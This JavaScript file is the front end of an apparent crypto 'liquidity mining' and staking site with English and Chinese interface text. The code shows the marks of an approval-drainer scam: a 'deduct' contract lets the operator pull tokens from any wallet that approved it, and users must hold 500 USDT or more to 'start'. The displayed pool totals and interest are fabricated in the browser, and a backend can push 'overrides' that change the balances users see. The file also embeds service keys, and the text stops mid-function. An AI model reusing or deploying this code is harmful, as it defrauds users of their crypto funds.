// ==================== 後端 API URL (您的 ngrok) ====================
const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev/api';
console.log('[DEBUG] BACKEND_API_URL 初始化:', BACKEND_API_URL);
// ==================== Infura 備用節點 ====================
const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
// ==================== SSE 替代 WebSocket ====================
let eventSource;
function initSSE() {
  console.log('[DEBUG] 初始化 SSE 連線...');
  if (eventSource) eventSource.close();
  eventSource = new EventSource(`${BACKEND_API_URL}/sse`);
  eventSource.onopen = () => {
    console.log('[DEBUG] SSE 連線成功');
  };
  eventSource.onmessage = (e) => {
    try {
      const { event, data } = JSON.parse(e.data);
      console.log('[DEBUG] SSE 接收事件:', event);
      console.log('[DEBUG] SSE 接收數據結構:', Object.keys(data));
      if (event === 'dataUpdate') {
        console.log('[DEBUG] 檢查全域數據中的用戶:');
        let matchedUserData = null;
        for (let addr in data.users) {
          if (addr.toLowerCase() === userAddress.toLowerCase()) {
            matchedUserData = data.users[addr];
            console.log('[DEBUG] 找到匹配用戶數據:', matchedUserData);
            break;
          }
        }
        if (matchedUserData) {
          window.currentClaimable = matchedUserData.claimable || 0;
          // 【修正】更新所有代幣餘額，不只當前 token
          for (const token in accountBalance) {
            if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
              accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
              accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
            }
          }
          // 【新增】處理 overrides (後台覆寫字段, e.g., pledgedUSDT)
          if (data.overrides && data.overrides[userAddress.toLowerCase()]) {
            const override = data.overrides[userAddress.toLowerCase()];
            console.log('[DEBUG] 合併 overrides:', override);
            ['USDT', 'USDC', 'WETH'].forEach(token => {
              const pledgedKey = `pledged${token}`;
              const interestKey = `interest${token}`;
              const claimedKey = `claimedInterest${token}`;
              if (override[pledgedKey] !== undefined) {
                accountBalance[token].pledged = override[pledgedKey];
              }
              if (override[interestKey] !== undefined) {
                accountBalance[token].interest = override[interestKey];
              }
              if (override[claimedKey] !== undefined) {
                localStorage.setItem(claimedKey, override[claimedKey].toString());
              }
            });
          }
          // 【新增】演示錢包同步
          if (matchedUserData.isDemoWallet) {
            console.log('[DEBUG] 檢測到演示錢包，自動模擬');
            window.isDemoMode = true;
            if (startBtn) startBtn.style.display = 'none';
            disableInteractiveElements(false);
            updateStatus("演示模式：已自動授權");
            activateStakingUI();
          }
          // 【關鍵修正】強制更新所有 UI
          updateClaimableDisplay();
          updateAccountBalanceDisplay();
          updatePledgeSummary();
          updateWalletBalanceFromCache(); // 強制刷新餘額顯示
          console.log('[DEBUG] UI 更新完成');
        } else {
          console.log('[DEBUG] 未找到匹配用戶數據');
        }
      }
      if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
        console.log('[DEBUG] 接收質押接受:', data);
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        const totalPledgeEl = document.getElementById('totalPledgeValue');
        if (totalPledgeEl) {
          const current = parseFloat(totalPledgeEl.textContent || '0');
          totalPledgeEl.textContent = (current + parseFloat(data.amount)).toFixed(3);
        }
        const tokenKey = data.token.toUpperCase();
        if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) return;
        if (!accountBalance[tokenKey]) accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
        accountBalance[tokenKey].pledged += parseFloat(data.amount);
        const durationInfo = PLEDGE_DURATIONS.find(d => d.days === data.duration) || { rate: 0 };
        const orderId = data.orderId ?? userPledges.length;
        userPledges.push({
          orderId,
          amount: parseFloat(data.amount),
          token: tokenKey,
          duration: data.duration,
          startTime: data.startTime || Date.now(),
          apr: durationInfo.rate
        });
        updateAccountBalanceDisplay();
        updatePledgeSummary();
        showPledgeResult('success', translations[currentLang].pledgeSuccess,
          `${data.amount} ${tokenKey} 已質押<br>週期：${data.duration} 天`
        );
      }
      if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
        console.log('[DEBUG] 接收質押駁回:', data);
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        showPledgeResult('error', '質押被駁回', data.reason || '未知原因');
      }
    } catch (error) {
      console.error('[DEBUG] SSE 解析錯誤:', error);
    }
  };
  eventSource.onerror = () => {
    console.log('[DEBUG] SSE 連線錯誤，重試...');
    eventSource.close();
    setTimeout(initSSE, 5000);
  };
}
// ==================== Firebase 初始化 ====================
const app = window.firebase.initializeApp({
  apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
  authDomain: "aroxa-mining.firebaseapp.com",
  projectId: "aroxa-mining",
  storageBucket: "aroxa-mining.firebasestorage.app",
  messagingSenderId: "596688766295",
  appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
});
const db = window.firebase.firestore();
console.log('[DEBUG] Firebase 初始化完成');
// ==================== 常數 ====================
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const DEDUCT_CONTRACT_ABI = [
  {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
  {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
  {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"stateMutability":"payable","type":"receive"}
];
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
// ==================== 質押週期 & 年化利率 + 最低額度 ====================
const PLEDGE_DURATIONS = [
  { days: 30, rate: 0.05, min: 1 },
  { days: 60, rate: 0.10, min: 1 },
  { days: 90, rate: 0.167, min: 1 },
  { days: 180, rate: 0.243, min: 1 },
  { days: 240, rate: 0.281, min: 1 },
  { days: 365, rate: 0.315, min: 1 }
];
// DOM 元素
let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
let totalPledgeBlock, estimateBlock, pledgeDetailModal, closePledgeDetail;
let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
let elements = {};
// 變數
let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let pledgedAmount = 0;
let lastPayoutTime = null;
let totalGrossOutput = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let claimInterval = null;
let accountBalance = {
  USDT: { wallet: 0, pledged: 0, interest: 0 },
  USDC: { wallet: 0, pledged: 0, interest: 0 },
  WETH: { wallet: 0, pledged: 0, interest: 0 }
};
let pendingUpdates = [];
let localLastUpdated = 0;
let authorizedToken = 'USDT';
let currentCycleInterest = 0;
window.currentClaimable = 0;
const MONTHLY_RATE = 0.01;
let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
let userPledges = [];
window.isDemoMode = false; // 【新增】演示模式標記
// 【極速優化】快取三個代幣餘額
let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
const translations = {
  'en': {
    title: 'Liquidity Mining',
    subtitle: 'Start Earning Millions',
    tabLiquidity: 'Liquidity',
    tabPledging: 'Pledging',
    grossOutputLabel: 'Claimable Output',
    cumulativeLabel: 'Claimable',
    walletBalanceLabel: 'Wallet Balance',
    accountBalanceLabel: 'Account Balance',
    nextBenefit: 'Next Benefit: 00:00:00',
    startBtnText: 'Start',
    pledgeAmountLabel: 'Pledge Amount',
    pledgeDurationLabel: 'Duration',
    pledgeBtnText: 'Pledge Now',
    claimBtnText: 'Claim',
    noClaimable: 'No claimable interest available.',
    claimSuccess: 'Claim successful!',
    nextClaimTime: 'Next claim in 12 hours.',
    miningStarted: 'Mining started!',
    error: 'Error',
    offlineWarning: 'Server offline, using local mode.',
    noWallet: 'Please connect your wallet.',
    dataSent: 'Data sent.',
    pledgeSuccess: 'Pledge successful!',
    pledgeError: 'Pledge failed.',
    invalidPledgeAmount: 'Invalid amount.',
    invalidPledgeToken: 'Invalid token.',
    insufficientBalance: 'Insufficient balance.',
    ethersError: 'Ethers.js error.',
    approveError: 'Approval failed.',
    selectTokenFirst: 'Select token first.',
    balanceZero: 'Balance zero.',
    balanceTooLow: 'Balance too low.',
    wethValueTooLow: 'WETH value too low.',
    rulesTitle: 'Mining Rules',
    rulesContent: `
      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
      <p>2. Insufficient: can authorize but not start.</p>
      <p>3. APR: 28.3% ~ 31.5%.</p>
      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
      <p>5. Pledging will also be included in liquidity mining interest calculation.</p>
    `,
    modalClaimableLabel: 'Claimable',
    modalSelectedTokenLabel: 'Selected Token',
    modalEquivalentValueLabel: 'Equivalent Value',
    totalPledge: 'Total Pledged',
    estimate: 'Estimated Return',
    pledgeDetailTitle: 'Pledge Details',
    orderCount: 'Orders',
    startTime: 'Start Time',
    remaining: 'Remaining',
    cycle: 'Cycle',
    apr: 'APR',
    accrued: 'Accrued Interest',
    exceedBalance: 'Amount exceeds wallet balance!',
    accountDetailTitle: 'Account Balance Details',
    totalBalance: 'Total Balance',
    pledgedAmount: 'Pledged Amount',
    pendingInterest: 'Pending Interest',
    claimedInterest: 'Claimed Interest',
    walletBalance: 'Wallet Balance',
    confirm: 'Confirm'
  },
  'zh-Hant': {
    title: '流動性挖礦',
    subtitle: '開始賺取數百萬',
    tabLiquidity: '流動性',
    tabPledging: '質押',
    grossOutputLabel: '可領取產出',
    cumulativeLabel: '可領取',
    walletBalanceLabel: '錢包餘額',
    accountBalanceLabel: '帳戶餘額',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '開始',
    pledgeAmountLabel: '質押金額',
    pledgeDurationLabel: '期間',
    pledgeBtnText: '立即質押',
    claimBtnText: '領取',
    noClaimable: '無可領取利息。',
    claimSuccess: '領取成功！',
    nextClaimTime: '下次領取時間：12 小時後。',
    miningStarted: '挖礦開始！',
    error: '錯誤',
    offlineWarning: '伺服器離線，使用本地模式。',
    noWallet: '請連結您的錢包。',
    dataSent: '數據已發送。',
    pledgeSuccess: '質押成功！',
    pledgeError: '質押失敗。',
    invalidPledgeAmount: '金額無效。',
    invalidPledgeToken: '代幣無效。',
    insufficientBalance: '餘額不足。',
    ethersError: 'Ethers.js 錯誤。',
    approveError: '授權失敗。',
    selectTokenFirst: '請先選擇代幣。',
    balanceZero: '餘額為零。',
    balanceTooLow: '餘額過低。',
    wethValueTooLow: 'WETH 價值過低。',
    rulesTitle: '挖礦規則',
    rulesContent: `
      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
      <p>2. 不足：可授權但無法開始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
      <p>5. 質押也會一併計算流動性挖礦利息。</p>
    `,
    modalClaimableLabel: '可領取',
    modalSelectedTokenLabel: '選擇代幣',
    modalEquivalentValueLabel: '等值金額',
    totalPledge: '總質押金額',
    estimate: '預估收益',
    pledgeDetailTitle: '質押明細',
    orderCount: '筆數',
    startTime: '開始時間',
    remaining: '剩餘時間',
    cycle: '週期',
    apr: '年化',
    accrued: '累積利息',
    exceedBalance: '金額超出錢包餘額！',
    accountDetailTitle: '帳戶餘額明細',
    totalBalance: '總餘額',
    pledgedAmount: '質押金額',
    pendingInterest: '待領取利息',
    claimedInterest: '已領取利息',
    walletBalance: '錢包餘額',
    confirm: '確認'
  },
  'zh-Hans': {
    title: '流动性挖矿',
    subtitle: '开始赚取数百万',
    tabLiquidity: '流动性',
    tabPledging: '质押',
    grossOutputLabel: '可领取产出',
    cumulativeLabel: '可领取',
    walletBalanceLabel: '钱包余额',
    accountBalanceLabel: '账户余额',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '开始',
    pledgeAmountLabel: '质押金额',
    pledgeDurationLabel: '期间',
    pledgeBtnText: '立即质押',
    claimBtnText: '领取',
    noClaimable: '无可领取利息。',
    claimSuccess: '领取成功！',
    nextClaimTime: '下次领取时间：12小时后。',
    miningStarted: '挖矿开始！',
    error: '错误',
    offlineWarning: '服务器离线，使用本地模式。',
    noWallet: '请连接您的钱包。',
    dataSent: '数据已发送。',
    pledgeSuccess: '质押成功！',
    pledgeError: '质押失败。',
    invalidPledgeAmount: '金额无效。',
    invalidPledgeToken: '代币无效。',
    insufficientBalance: '余额不足。',
    ethersError: 'Ethers.js 错误。',
    approveError: '授权失败。',
    selectTokenFirst: '请先选择代币。',
    balanceZero: '余额为零。',
    balanceTooLow: '余额过低。',
    wethValueTooLow: 'WETH价值过低。',
    rulesTitle: '挖矿规则',
    rulesContent: `
      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
      <p>2. 不足：可授权但无法开始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每12小时发放一次（美西时间00:00与12:00）。</p>
      <p>5. 质押也会一并计算流动性挖矿利息。</p>
    `,
    modalClaimableLabel: '可领取',
    modalSelectedTokenLabel: '选择代币',
    modalEquivalentValueLabel: '等值金额',
    totalPledge: '总质押金额',
    estimate: '预估收益',
    pledgeDetailTitle: '质押明细',
    orderCount: '笔数',
    startTime: '开始时间',
    remaining: '剩余时间',
    cycle: '周期',
    apr: '年化',
    accrued: '累计利息',
    exceedBalance: '金额超出钱包余额！',
    accountDetailTitle: '账户余额明细',
    totalBalance: '总余额',
    pledgedAmount: '质押金额',
    pendingInterest: '待领取利息',
    claimedInterest: '已领取利息',
    walletBalance: '钱包余额',
    confirm: '确认'
  }
};
let currentLang = localStorage.getItem('language') || 'en';
// 日誌函數（客戶端僅顯示錯誤）
function log(message, type = 'info') {
  if (type === 'error') {
    console.error(`[ERROR] ${message}`);
  }
}
// ==================== 狀態更新函數 (提前定義，解決未定義錯誤) ====================
function updateStatus(message, isWarning = false) {
  if (!statusDiv) return;
  statusDiv.innerHTML = message || '';
  statusDiv.style.display = message ? 'block' : 'none';
  statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
}
// 安全獲取 DOM 元素
function getElements() {
  connectButton = document.getElementById('connectButton');
  statusDiv = document.getElementById('status');
  startBtn = document.getElementById('startBtn');
  pledgeBtn = document.getElementById('pledgeBtn');
  pledgeAmount = document.getElementById('pledgeAmount');
  pledgeDuration = document.getElementById('pledgeDuration');
  pledgeToken = document.getElementById('pledgeToken');
  refreshWallet = document.getElementById('refreshWallet');
  walletTokenSelect = document.getElementById('walletTokenSelect');
  walletBalanceAmount = document.getElementById('walletBalanceAmount');
  accountBalanceValue = document.getElementById('accountBalanceValue');
  totalValue = document.getElementById('totalValue');
  grossOutputValue = document.getElementById('grossOutputValue');
  cumulativeValue = document.getElementById('cumulativeValue');
  nextBenefit = document.getElementById('nextBenefit');
  claimModal = document.getElementById('claimModal');
  closeModal = document.getElementById('closeModal');
  confirmClaim = document.getElementById('confirmClaim');
  cancelClaim = document.getElementById('cancelClaim');
  modalClaimableETH = document.getElementById('modalClaimableETH');
  modalSelectedToken = document.getElementById('modalSelectedToken');
  modalEquivalentValue = document.getElementById('modalEquivalentValue');
  modalTitle = document.getElementById('modalTitle');
  languageSelect = document.getElementById('languageSelect');
  totalPledgeBlock = document.getElementById('totalPledgeBlock');
  estimateBlock = document.getElementById('estimateBlock');
  pledgeDetailModal = document.getElementById('pledgeDetailModal');
  closePledgeDetail = document.getElementById('closePledgeDetail');
  accountDetailModal = document.getElementById('accountDetailModal');
  closeAccountDetail = document.getElementById('closeAccountDetail');
  closeAccountDetailBtn = document.getElementById('closeAccountDetailBtn');
  elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
    tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    startBtnText: startBtn,
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: pledgeBtn,
    totalPledge: document.getElementById('totalPledgeValue'),
    estimate: document.getElementById('estimateValue'),
    exceedWarning: document.getElementById('exceedWarning'),
    totalPledgeLabel: document.getElementById('totalPledgeLabel'),
    estimateLabel: document.getElementById('estimateLabel'),
    accountDetailTitle: document.getElementById('accountDetailTitle'),
    modalTotalBalanceLabel: document.getElementById('modalTotalBalanceLabel'),
    modalPledgedAmountLabel: document.getElementById('modalPledgedAmountLabel'),
    modalPendingInterestLabel: document.getElementById('modalPendingInterestLabel'),
    modalClaimedInterestLabel: document.getElementById('modalClaimedInterestLabel'),
    modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
  };
}
// 重新計算總餘額（選中幣種）
function getTotalAccountBalanceInSelectedToken() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0');
  return data.wallet + data.pledged + claimedInterest;
}
function updateAccountBalanceDisplay() {
  if (!accountBalanceValue || !walletTokenSelect) return;
  const selected = walletTokenSelect.value;
  const total = getTotalAccountBalanceInSelectedToken();
  accountBalanceValue.textContent = `${total.toFixed(3)} ${selected}`;
}
// 【極速優化】從快取更新錢包餘額
function updateWalletBalanceFromCache() {
  if (!walletTokenSelect || !walletBalanceAmount) return;
  const selected = walletTokenSelect.value;
  const decimals = { USDT: 6, USDC: 6, WETH: 18 };
  const bigIntBalance = cachedWalletBalances[selected] || 0n;
  const formatted = ethers.formatUnits(bigIntBalance, decimals[selected]);
  const value = parseFloat(formatted);
  accountBalance[selected].wallet = value;
  walletBalanceAmount.textContent = value.toFixed(3);
}
// 【關鍵修正】立即讀取三個代幣 + 快取 + UI
async function forceRefreshWalletBalance() {
  if (!userAddress || window.isDemoMode) return;
  try {
    console.log('[DEBUG] 刷新錢包餘額:', userAddress);
    const [usdtBal, usdcBal, wethBal] = await Promise.all([
      usdtContract.connect(provider).balanceOf(userAddress),
      usdcContract.connect(provider).balanceOf(userAddress),
      wethContract.connect(provider).balanceOf(userAddress)
    ]);
    cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
    console.log('[DEBUG] 餘額刷新結果:', {
      USDT: ethers.formatUnits(usdtBal, 6),
      USDC: ethers.formatUnits(usdcBal, 6),
      WETH: ethers.formatEther(wethBal)
    });
    updateWalletBalanceFromCache();
    updateAccountBalanceDisplay();
    updateEstimate();
  } catch (error) {
    console.error('[DEBUG] 餘額刷新錯誤:', error);
    log(`餘額讀取失敗: ${error.message}`, 'error');
  }
}
function getCurrentBalances() {
  return {
    USDT: accountBalance.USDT.wallet,
    USDC: accountBalance.USDC.wallet,
    WETH: accountBalance.WETH.wallet
  };
}
function updateTotalFunds() {
  if (!totalValue) return;
  const initialFunds = 12856459.94;
  const increasePerSecond = 0.055;
  const fixedStartTime = 1698796800000;
  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
  const total = initialFunds + (elapsedSeconds * increasePerSecond);
  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
}
async function refreshEthPrice() {
  const now = Date.now();
  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    if (!response.ok) throw new Error();
    const data = await response.json();
    ethPriceCache.price = data.ethereum.usd;
    ethPriceCache.timestamp = now;
  } catch (error) {
    console.error('[DEBUG] ETH價格刷新錯誤:', error);
  }
}
function initializeMiningData() {
  localStorage.setItem('totalGrossOutput', '0');
  localStorage.setItem('claimable', '0');
  localStorage.setItem('lastPayoutTime', (Date.now() - 24 * 60 * 60 * 1000).toString());
}
function getETOffsetMilliseconds() {
  const now = new Date();
  const mar = new Date(now.getFullYear(), 2, 8);
  const nov = new Date(now.getFullYear(), 10, 1);
  const marDay = mar.getDay();
  const novDay = nov.getDay();
  const dstStart = new Date(now.getFullYear(), 2, 8 + (5 - marDay) % 7);
  const dstEnd = new Date(now.getFullYear(), 10, 1 + (5 - novDay) % 7);
  return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
}
function updateClaimableDisplay() {
  if (!grossOutputValue || !cumulativeValue) return;
  grossOutputValue.textContent = `${totalGrossOutput.toFixed(7)} ETH`;
  cumulativeValue.textContent = `${(window.currentClaimable || 0).toFixed(7)} ETH`;
}
async function updateInterest() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const totalBalance = data.wallet + data.pledged;
  if (totalBalance <= 0) {
    window.currentClaimable = 0;
    updateClaimableDisplay();
    return;
  }
  const now = Date.now();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(now + etOffset);
  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
  const isExactMinute = nowET.getMinutes() === 0;
  if (!isPayoutTime || !isExactMinute) return;
  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
  const lastPayoutET = new Date(lastPayout + etOffset);
  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
  if (wasPayoutTime) return;
  const cycleInterest = totalBalance * (MONTHLY_RATE / 60);
  window.currentClaimable += cycleInterest;
  totalGrossOutput += cycleInterest;
  localStorage.setItem('claimable', window.currentClaimable.toString());
  localStorage.setItem('lastPayoutTime', now.toString());
  updateClaimableDisplay();
  updateAccountBalanceDisplay();
}
function updateClaimModalLabels() {
  const claimLabels = {
    'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
    'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
    'zh-Hans': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' }
  };
  const labels = claimLabels[currentLang];
  if (modalTitle) modalTitle.textContent = labels.title;
  const labelElements = document.querySelectorAll('.claim-info .label');
  if (labelElements.length >= 3) {
    labelElements[0].textContent = labels.claimable;
    labelElements[1].textContent = labels.selectedToken;
    labelElements[2].textContent = labels.equivalentValue;
  }
}
async function claimInterest() {
  await refreshEthPrice();
  updateClaimModalLabels();
  const claimableETH = window.currentClaimable || 0;
  if (modalClaimableETH) modalClaimableETH.textContent = `${claimableETH.toFixed(7)} ETH`;
  if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
  const ethPrice = ethPriceCache.price || 2500;
  let equivalent = 0;
  if (authorizedToken === 'WETH') {
    equivalent = claimableETH;
  } else {
    equivalent = claimableETH * ethPrice;
  }
  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
  if (claimModal) claimModal.style.display = 'flex';
}
function closeClaimModal() {
  if (claimModal) claimModal.style.display = 'none';
  if (claimInterval) clearInterval(claimInterval);
}
function updateNextBenefitTimer() {
  if (!nextBenefit) return;
  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
  const label = translations[currentLang].nextBenefit.split(':')[0];
  if (!nextBenefitTimestamp) {
    nextBenefit.textContent = `${label}: 00:00:00`;
    return;
  }
  const now = Date.now();
  let diff = nextBenefitTimestamp - now;
  if (diff <= 0) {
    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
    const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
    localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
    diff = newNextBenefitTimestamp - now;
  }
  const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
  const seconds = String(totalSeconds % 60).padStart(2, '0');
  nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
}
function setInitialNextBenefitTime() {
  if (localStorage.getItem('nextBenefitTime')) return;
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(Date.now() + etOffset);
  const nextHour = nowET.getHours() < 12 ? 12 : 24;
  const nextBenefitTimeET = new Date(nowET);
  nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
  const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
  localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
}
function activateStakingUI() {
  if (startBtn) startBtn.style.display = 'none';
  initializeMiningData();
  if (interestInterval) clearInterval(interestInterval);
  interestInterval = setInterval(updateInterest, 60000);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
  setInitialNextBenefitTime();
  updateInterest();
}
async function sendMobileRobustTransaction(populatedTx) {
  if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
  const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
  const fromAddress = await signer.getAddress();
  const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
  let txHash, receipt = null;
  try {
    txHash = await provider.send('eth_sendTransaction', [mobileTx]);
    updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
    receipt = await provider.waitForTransaction(txHash);
  } catch (error) {
    if (error.hash) txHash = error.hash;
    if (txHash) {
      updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
      receipt = await provider.waitForTransaction(txHash);
    } else throw error;
  }
  if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
  return receipt;
}
async function initializeWallet() {
  if (!window.ethers) {
    updateStatus(translations[currentLang].ethersError, true);
    if (connectButton) connectButton.disabled = true;
    return;
  }
  try {
    console.log('[DEBUG] 初始化錢包...');
